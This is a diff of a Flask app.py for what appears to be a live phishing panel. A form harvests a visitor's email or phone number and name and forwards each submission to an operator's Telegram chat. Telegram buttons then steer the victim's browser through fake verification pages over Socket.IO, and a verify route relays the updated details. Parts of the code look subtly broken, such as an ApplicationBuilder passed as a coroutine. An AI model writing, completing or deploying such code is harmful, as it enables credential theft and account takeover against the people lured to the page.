@@ -1,34 +1,21 @@
-from flask import Flask, request, redirect
-from flask_socketio import SocketIO
-import uuid
-import threading
-import asyncio
+# app.py
 
-from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CallbackQueryHandler, MessageHandler, filters
+from flask import Flask, request, render_template_string
+from flask_socketio import SocketIO
+import threading, uuid, asyncio
 
 from state import user_rooms
+from page_templates import MAIN_PAGE, WAIT_PAGE
 from socket_handlers import register_socket_handlers
-from telegram_handlers import button_callback, handle_greeting
-from pages import PAGE_6_HTML
-
-# CONFIG
-BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
-FRONTEND_URL = "https://YOUR_CLOUDFLARE_PAGES_DOMAIN"
+import telegram_handlers
 
 app = Flask(__name__)
-app.config["SECRET_KEY"] = "secret"
+app.config['SECRET_KEY'] = 'secret!'
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
-telegram_bot = Bot(token=BOT_TOKEN)
-
-# SINGLE EVENT LOOP
+# ---------------- ASYNC TELEGRAM LOOP ----------------
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
-
-def run_async(coro):
-    asyncio.run_coroutine_threadsafe(coro, loop)
 
 def start_loop():
     asyncio.set_event_loop(loop)
@@ -36,74 +23,68 @@ def start_loop():
 
 threading.Thread(target=start_loop, daemon=True).start()
 
+def run_async_task(coro):
+    asyncio.run_coroutine_threadsafe(coro, loop)
 
-# ROUTES -------------------------------------------------
+# expose function globally for telegram_handlers
+update_user_page = register_socket_handlers(socketio)
+telegram_handlers.update_user_page = update_user_page
 
-@app.route("/submit", methods=["POST"])
-def submit():
-    email = request.form.get("email")
-    name = request.form.get("name")
 
-    room_id = str(uuid.uuid4())
-    user_rooms[room_id] = {
-        "email": email,
-        "name": name,
-        "greeting": "Your security questions have been verified.",
-        "expect_greeting": False
-    }
+# ---------------- ROUTES ----------------
+@app.route("/", methods=["GET", "POST"])
+def main_form():
+    if request.method == "POST":
+        email = request.form.get("email")
+        name = request.form.get("name")
 
-    keyboard = [
-        [InlineKeyboardButton("📧 EMAIL", callback_data=f"{room_id}:Page 1"),
-         InlineKeyboardButton("📞 PHONE", callback_data=f"{room_id}:Page 2")],
-        [InlineKeyboardButton("📝 TYPE", callback_data=f"{room_id}:Page 3"),
-         InlineKeyboardButton("✅ ACCEPT", callback_data=f"{room_id}:Page 4")],
-        [InlineKeyboardButton("❌📧📞", callback_data=f"{room_id}:Page 5"),
-         InlineKeyboardButton("⏳ LOAD", callback_data=f"{room_id}:Page 6")],
-        [InlineKeyboardButton("❌ VERIFY", callback_data=f"{room_id}:Page 7")]
-    ]
+        room_id = str(uuid.uuid4())
 
-    markup = InlineKeyboardMarkup(keyboard)
+        user_rooms[room_id] = {
+            "email": email,
+            "name": name,
+            "greeting": "Your security questions have been verified.",
+            "expect_greeting": False
+        }
 
-    run_async(telegram_bot.send_message(
-        chat_id=CHAT_ID,
-        text=f"🧾 New Submission\nRoom: {room_id}\nEmail: {email}\nName: {name}",
-        reply_markup=markup
-    ))
+        kb = telegram_handlers.build_keyboard(room_id)
 
-    # Redirect user to WAIT PAGE on frontend
-    return redirect(f"{FRONTEND_URL}/wait.html?room={room_id}")
+        run_async_task(
+            telegram_handlers.ApplicationBuilder().token(telegram_handlers.BOT_TOKEN)
+        )
+
+        telegram_handlers.run_async_task(
+            telegram_handlers.telegram_bot.send_message(
+                chat_id=telegram_handlers.CHAT_ID,
+                text=f"🧾 New Submission\nRoom: {room_id}\nEmail/Number: {email}\nName: {name}",
+                reply_markup=kb
+            )
+        )
+
+        return render_template_string(WAIT_PAGE, room_id=room_id)
+
+    return render_template_string(MAIN_PAGE)
 
 
 @app.route("/verify_email", methods=["POST"])
 def verify_email():
     room_id = request.form.get("room_id")
-    verified = request.form.get("verified_email")
+    verified_email = request.form.get("verified_email")
 
-    if room_id in user_rooms:
-        user_rooms[room_id]["email"] = verified
+    user = user_rooms.get(room_id)
+    if user:
+        user["email"] = verified_email
 
-    run_async(telegram_bot.send_message(
-        chat_id=CHAT_ID,
-        text=f"Verified\nRoom: {room_id}\nNew Email/Number: {verified}"
-    ))
+    telegram_handlers.run_async_task(
+        telegram_handlers.telegram_bot.send_message(
+            chat_id=telegram_handlers.CHAT_ID,
+            text=f"Email Verified\nRoom: {room_id}\nEmail: {verified_email}"
+        )
+    )
 
-    return redirect(f"{FRONTEND_URL}/wait.html?room={room_id}")
+    return render_template_string(WAIT_PAGE, room_id=room_id)
 
-
-# TELEGRAM BOT THREAD ----------------------------------
-
-def start_bot():
-    teleapp = ApplicationBuilder().token(BOT_TOKEN).build()
-    teleapp.add_handler(CallbackQueryHandler(button_callback))
-    teleapp.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_greeting))
-    teleapp.run_polling()
-
-threading.Thread(target=start_bot, daemon=True).start()
-
-# SOCKET HANDLERS
-register_socket_handlers(socketio)
-
-# MAIN ---------------------------------------------------
 
 if __name__ == "__main__":
-    socketio.run(app, host="0.0.0.0", port=10000)
+    threading.Thread(target=telegram_handlers.start_telegram_bot, daemon=True).start()
+    socketio.run(app, host="0.0.0.0", port=10000, allow_unsafe_werkzeug=True)
